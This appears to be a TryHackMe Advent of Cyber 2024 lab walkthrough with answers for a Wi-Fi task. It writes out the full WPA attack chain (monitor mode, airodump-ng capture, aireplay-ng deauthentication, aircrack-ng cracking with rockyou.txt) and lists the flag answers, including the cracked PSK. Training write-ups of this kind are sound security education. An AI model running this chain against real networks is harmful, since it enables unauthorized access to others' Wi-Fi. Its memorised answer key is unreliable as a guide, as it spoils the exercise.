**Advent of Cyber 2024 [Day 11] Writeup with Answers | TryHackMe Walkthrough**
**Task 17 — WiFi Attacks: If you'd like to WPA, press the star key!**
This task involves performing Wi-Fi attacks, specifically capturing WPA handshakes and cracking them to retrieve the PSK (Pre-Shared Key) of a target network.

### **Steps to Solve the Task:**
**Pre-requisite:** Make sure you are connected to the VPN before starting the task.

#### **1. What is the BSSID of our wireless interface?**
To find the BSSID of the wireless interface, follow these steps:

1. Open **two terminals** and connect to the machine via SSH with the provided credentials:
    `ssh glitch@MACHINE_IP`
    
2. In the **first terminal**, run the following commands to set your wireless interface `wlan2` to monitor mode:
    `sudo ip link set dev wlan2 down sudo iw dev wlan2 set type monitor sudo ip link set dev wlan2 up`
    
3. This will display the **BSSID** of the wireless interface in use.
    

**Answer:**
`02:00:00:00:02:00`

#### **2. What is the SSID and BSSID of the access point?**

In the **first terminal**, run the following command to capture information about the nearby networks:
`sudo airodump-ng wlan2`

This will display the list of Wi-Fi networks, their SSID, and BSSID. Look for the access point of interest.

**Answer:**
`MalwareM_AP, 02:00:00:00:00:00`

#### **3. What is the BSSID of the wireless interface that is already connected to the access point?**

To find the BSSID of the wireless interface connected to the access point, run the following command in the **first terminal** to start the attack and capture packets:
`sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2`

This command will show the client information, including the BSSID of the connected device.

**Answer:**
`02:00:00:00:01:00`

#### **4. What is the PSK after performing the WPA cracking attack?**

To capture the WPA handshake, perform a **deauthentication attack** to force the client to reconnect to the access point. In the **second terminal**, run the following command:
`sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2`

This will deauthenticate the client and cause them to reconnect, sending the WPA handshake.

After the deauthentication attack is successful, use **aircrack-ng** to crack the WPA handshake captured in the output file:
`sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap`

This command uses the **rockyou.txt** wordlist to crack the WPA key.

**Answer:**
`fluffy/champ24`

---

### **Summary of Answers:**

1. **BSSID of the wireless interface:** 02:00:00:00:02:00
2. **SSID and BSSID of the access point:** MalwareM_AP, 02:00:00:00:00:00
3. **BSSID of the connected wireless interface:** 02:00:00:00:01:00
4. **PSK after WPA cracking attack:** fluffy/champ24

This task demonstrates how to perform WPA cracking attacks on a Wi-Fi network using tools like `aircrack-ng`, `aireplay-ng`, and `airodump-ng` to capture handshakes and crack the PSK.